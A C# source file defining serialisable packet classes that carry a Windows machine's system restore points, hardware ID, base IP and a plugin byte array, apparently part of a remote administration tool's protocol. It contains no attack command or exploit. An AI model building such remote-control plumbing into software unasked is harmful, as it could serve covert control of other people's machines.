using System;
using System.Collections.Generic;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace PacketLib.Packet
{
    [Serializable]
    public class RestorePoint 
    {
        public uint index { get; set; }
        public string creationTime { get; set; }
        public string description { get; set; }
        public RestorePointType type { get; set; }
        public enum RestorePointType
        {
            APPLICATION_INSTALL = 0,
            APPLICATION_UNINSTALL = 1,
            CANCELLED_OPERATION = 13,
            DEVICE_DRIVER_INSTALL = 10,
            MODIFY_SETTINGS = 12,
            MANUALLY_CREATED = 16
        }
    }

    [Serializable]
    public class RestorePointPacket : IPacket
    {
        public RestorePointPacket() : base()
        {
            this.PacketType = PacketType.UAC_GET_RESTORE_POINT;
        }

        public RestorePointPacket(List<RestorePoint> restorePoints, string baseIp, string HWID) : base()
        {

            PacketType = PacketType.UAC_GET_RESTORE_POINT;
            this.BaseIp = baseIp;
            this.HWID = HWID;

            this.restorePoints = restorePoints;
        }

        public string HWID { get; set; }
        public string BaseIp { get; set; }
        public byte[] Plugin { get; set; }
        public PacketType PacketType { get; }
        public PacketState PacketState { get; set; }
        public string Status { get; set; }
        public string DatePacketStatus { get; set; }
        public int PacketSize { get; set; }

        public List<RestorePoint> restorePoints { get; set; }

    }
}
